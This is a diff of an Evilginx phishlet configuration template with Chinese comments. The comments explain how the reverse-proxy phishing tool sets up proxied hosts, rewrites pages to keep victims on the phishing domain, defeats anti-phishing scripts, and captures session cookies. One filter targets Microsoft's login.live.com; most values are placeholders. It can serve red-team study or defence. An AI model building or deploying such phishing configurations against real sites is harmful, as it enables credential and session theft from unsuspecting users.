@@ -1,11 +1,52 @@
+### https://help.evilginx.com/docs/phishlet-format
+name: 'linkedin' # 网络钓鱼的名称，通常是网络钓鱼网站的名称
+author: '@mrgretzky' #  作者
 min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
-auth_tokens:
-  - domain: '.academy.breakdev.org'
-    keys: ['cookie_name']
+proxy_hosts: # Evilginx 将管理的子域数组。这提供了您想要拦截传输的所有主机名的数组，并使您能够进行动态数据包修改
+  - {
+    phish_sub: 'academy', # 将作为 phishlet 主机名前缀的子域名。我建议将其保留为与原始子域名相同，因为稍后在正确进行字符串替换时可能会出现问题，因为它通常需要额外的工作来支持自定义子域名
+    orig_sub: 'academy', # 原始子域名
+    domain: 'breakdev.org', # 网站域名
+    session: true, # 将此设置为true 仅适用于将返回身份验证 cookie 的子域。这表明 Evilginx 应将哪个子域识别为将启动 Evilginx 会话创建的子域，并为此条目的域名设置 Evilginx 会话 cookie
+    is_landing: true,  # 如果您希望此子域稍后用于生成网络钓鱼 URL，请将此设置为。
+    auto_filter: true # （新）：如果设置为true（默认）代理，则尝试自动创建sub_filters该主机所需的代理，而无需手动指定它们。
+  }
+sub_filters: # 介绍您可以定义以动态修改代理网站内容的所有字符串替换过滤器。这对于用网络钓鱼代理 URL 替换所有出现的合法网站 URL 非常重要，以防止浏览器在访问者完成身份验证过程之前将其重定向到合法网站。过滤器还可用于删除或修改 javascript 反网络钓鱼安全措施
+  - {
+    triggers_on: 'breakdev.org', # 将为其触发过滤器的原始主机名。访问者和定义的合法主机之间的代理数据（该参数的值）将触发此替换过滤器。选择 Evilginx 代理将动态修改代理主机的通信。
+    orig_sub: 'academy', # 将在所有出现的字符串搜索中使用的合法主机的子域名。
+    domain: 'breakdev.org', # 将在所有出现的字符串搜索中使用的合法主机的域名。
+    search: 'something_to_look_for', # 用于搜索响应正文中出现的字符串的正则表达式。还支持正则表达式组。请参阅下面您可以使用的受支持的自动填充变量的列表。
+    replace: 'replace_it_with_this', # 将替换所有与正则search表达式匹配的字符串的字符串。如果在字段中定义了正则表达式组search，请在此处引用它们，例如${1}where1是组索引。请参阅下面您可以使用的受支持的自动填充变量的列表。
+    mimes: [ 'text/html' ] # 过滤只会触发Content-Type标头值等于此处定义的任何 MIME 类型的响应数据包。
+  }
+  - {
+    triggers_on: 'login.live.com',
+    orig_sub: 'login',
+    domain: 'live.com',
+    search: 'https://{hostname}/GetCredentialType.srf',
+    ## search
+    ##  您可以在和字段中使用以下自动填充变量replace
+    ##   { hostname }    当在字段中使用时search，它将成为由orig_sub和组合而成的主机名domain，在同一条目中定义sub_filter。在现场使用时replace，通过查找proxy_hosts部分中配置的条目，组合主机名将自动转换为相应的网络钓鱼主机名。这对于将响应中出现的所有网站原始主机名替换为网络钓鱼主机名非常有用。（例如www.linkedin.no-phish.com）
+    ##  { subdomain }    工作方式与 相同{ hostname }，但仅引用orig_subfield 中定义的子域。（例如www）
+    ##  { domain }    工作方式与 相同{ hostname }，但仅引用domainfield 中定义的域。（例如linkedin.no-phish.com）
+    ##   { orig_hostname }    仅用于替换。替换为原始主机名，不会被转换为钓鱼主机名。（例如www.linkedin.com）
+    ##  { orig_domain }    仅用于替换。替换为原域名，不会转为钓鱼域名。（例如linkedin.com）
+    ##   { basedomain }    工作方式与 相同{ domain }，但它不服务整个 phishlet 域，而是仅使用全局配置中定义的基本顶级域。（例如no-phish.com）
+    ##  { hostname_regexp }    相当于{ hostname }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+    ##  { subdomain_regexp }    相当于{ subdomain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+    ##  { domain_regexp }    相当于{ domain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+    ##  { basedomain_regexp }    相当于{ basedomain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+    replace: 'https://{hostname}/GetCredentialType.srf',
+    mimes: [ 'text/html', 'application/json', 'application/javascript' ],
+    redirect_only: true, # iftrue表示仅在生成钓鱼 URL 时指定重定向 URL 时才会触发过滤器。
+    with_params: [ "ddd" ] # 	仅当以下所有自定义参数均随网络钓鱼 URL 一起传递时才启用此过滤器。
+  }
+
+auth_tokens: #定义要在传输的代理请求或响应中捕获的令牌。令牌可以从服务器发送的 cookie 或响应正文中提取，也可以从客户端请求中的 HTTP 标头中提取。当检索到所有令牌时，身份验证会话被视为已完全捕获，并且网络钓鱼攻击被视为成功。发生这种情况时，用户将被重定向到网络钓鱼诱饵中指定的 URL
+  - domain: '.academy.breakdev.org' # 域名与Set-Cookie标头内容中定义的完全一致。as.前缀表示将为该域的所有子域发送 cookie。
+    keys: [ 'cookie_name' ], #将搜索和捕获的 cookie 的确切名称。可用的键修饰符可以在下面找到。
+    type:  'cookie' #   必须设置为cookie
 credentials:
   username:
     key: 'email'
